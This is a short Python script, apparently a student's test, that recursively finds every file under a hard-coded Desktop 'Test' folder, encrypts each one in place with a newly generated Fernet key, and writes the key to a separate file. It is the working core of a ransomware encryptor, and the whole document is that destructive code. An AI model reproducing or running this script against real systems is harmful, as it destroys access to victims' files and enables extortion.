import os
from cryptography.fernet import Fernet as cryp

files=[]

link_folder=r"C:\Users\ADMIN\OneDrive - Hanoi University of Science and Technology\Desktop\Test"

def find_file(link_path):
    for file in os.listdir(link_path):
        newlink = os.path.join(link_path, file)
        if os.path.isfile(newlink):
            files.append(newlink)
        else:
            find_file(newlink)

def encryp_file(key, files):
    for file in files:
        with open(file, "rb") as read:
            data=read.read()
        encrypted_data=cryp(key).encrypt(data)
        with open(file, "wb") as write:
            write.write(encrypted_data)


key = cryp.generate_key()
with open(r"C:\Users\ADMIN\OneDrive - Hanoi University of Science and Technology\Desktop\key.key", "wb") as thekey:
    thekey.write(key)


find_file(link_folder)
encryp_file(key, files)